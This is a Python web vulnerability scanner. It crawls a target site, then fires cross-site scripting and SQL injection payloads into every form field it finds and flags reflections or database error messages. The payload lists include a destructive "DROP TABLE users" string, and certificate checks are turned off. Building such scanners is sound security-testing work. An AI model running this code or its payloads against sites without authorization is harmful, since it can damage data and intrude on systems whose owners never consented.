"""
web_scanner.py - Advanced web application vulnerability scanning
"""
import re
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse

class WebScanner:
    def __init__(self, target, threads=5, timeout=10, user_agent=None, cookies=None):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.discovered_urls = set()
        self.forms = []
        self.vulnerabilities = []
        self.headers = {
            'User-Agent': user_agent or 'VulnScan-WebScanner/1.0'
        }
        self.cookies = cookies or {}
        
    def crawl(self, max_urls=100):
        """Crawl target website to discover URLs and forms"""
        try:
            visited = set()
            to_visit = [f"http://{self.target}/"]
            
            while to_visit and len(visited) < max_urls:
                current_url = to_visit.pop(0)
                if current_url in visited:
                    continue
                    
                visited.add(current_url)
                try:
                    response = requests.get(
                        current_url, 
                        headers=self.headers,
                        cookies=self.cookies,
                        timeout=self.timeout,
                        verify=False
                    )
                    if 'text/html' not in response.headers.get('Content-Type', ''):
                        continue
                        
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    for a_tag in soup.find_all('a', href=True):
                        href = a_tag['href']
                        full_url = urljoin(current_url, href)
                        
                        # Stay on same domain
                        if urlparse(full_url).netloc == self.target:
                            self.discovered_urls.add(full_url)
                            to_visit.append(full_url)
                    
                    # Find all forms
                    for form in soup.find_all('form'):
                        form_data = {
                            'action': urljoin(current_url, form.get('action', '')),
                            'method': form.get('method', 'get').lower(),
                            'inputs': []
                        }
                        
                        for input_field in form.find_all(['input', 'textarea']):
                            input_type = input_field.get('type', '')
                            input_name = input_field.get('name', '')
                            if input_name and input_type != 'submit':
                                form_data['inputs'].append({
                                    'name': input_name,
                                    'type': input_type
                                })
                        
                        self.forms.append(form_data)
                        
                except Exception as e:
                    print(f"Error crawling {current_url}: {str(e)}")
            
            return len(self.discovered_urls)
            
        except Exception as e:
            print(f"Crawling error: {str(e)}")
            return 0
    
    def scan_xss(self):
        """Scan for Cross-Site Scripting vulnerabilities"""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '\" onmouseover=\"alert(\'XSS\')',
            '<svg/onload=alert("XSS")>'
        ]
        
        results = []
        
        for form in self.forms:
            action_url = form['action']
            method = form['method']
            
            for payload in xss_payloads:
                # Create form data with XSS payload in each field
                for input_field in form['inputs']:
                    data = {}
                    for field in form['inputs']:
                        if field['name'] == input_field['name']:
                            data[field['name']] = payload
                        else:
                            data[field['name']] = 'test'
                    
                    try:
                        if method == 'post':
                            response = requests.post(
                                action_url,
                                data=data,
                                headers=self.headers,
                                cookies=self.cookies,
                                timeout=self.timeout,
                                allow_redirects=False,
                                verify=False
                            )
                        else:
                            response = requests.get(
                                action_url,
                                params=data,
                                headers=self.headers,
                                cookies=self.cookies,
                                timeout=self.timeout,
                                allow_redirects=False,
                                verify=False
                            )
                        
                        # Check if payload is reflected in response
                        if payload in response.text:
                            vuln = {
                                'type': 'XSS',
                                'url': action_url,
                                'method': method,
                                'param': input_field['name'],
                                'payload': payload,
                                'evidence': f"Reflected XSS in {input_field['name']} parameter"
                            }
                            results.append(vuln)
                            
                    except Exception as e:
                        continue
        
        return results

    def scan_sqli(self):
        """Scan for SQL Injection vulnerabilities"""
        sqli_payloads = [
            "' OR '1'='1", 
            "' OR '1'='1' --", 
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "1' OR '1' = '1",
            "1; SELECT 1,2,3 FROM users WHERE 1=1"
        ]
        sqli_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-01756",
            "SQLite3::query",
            "PostgreSQL",
            "mysqli_fetch_array",
            "System.Data.SQLite.SQLiteException"
        ]
        
        results = []
        
        for form in self.forms:
            action_url = form['action']
            method = form['method']
            
            for payload in sqli_payloads:
                # Create form data with SQL injection payload in each field
                for input_field in form['inputs']:
                    data = {}
                    for field in form['inputs']:
                        if field['name'] == input_field['name']:
                            data[field['name']] = payload
                        else:
                            data[field['name']] = 'test'
                    
                    try:
                        if method == 'post':
                            response = requests.post(
                                action_url,
                                data=data,
                                headers=self.headers,
                                cookies=self.cookies,
                                timeout=self.timeout,
                                verify=False
                            )
                        else:
                            response = requests.get(
                                action_url,
                                params=data,
                                headers=self.headers,
                                cookies=self.cookies,
                                timeout=self.timeout,
                                verify=False
                            )
                        
                        # Check for SQL error messages in response
                        for error in sqli_errors:
                            if error.lower() in response.text.lower():
                                vuln = {
                                    'type': 'SQL Injection',
                                    'url': action_url,
                                    'method': method,
                                    'param': input_field['name'],
                                    'payload': payload,
                                    'evidence': f"SQL error detected: {error}"
                                }
                                results.append(vuln)
                                break
                            
                    except Exception as e:
                        continue
        
        return results

    def run_scan(self):
        """Run all web vulnerability scans"""
        results = {}
        
        # First crawl the website
        num_urls = self.crawl()
        results['crawled_urls'] = num_urls
        
        # Run vulnerability scanners
        results['xss_vulnerabilities'] = self.scan_xss()
        results['sql_vulnerabilities'] = self.scan_sqli()
        
        return results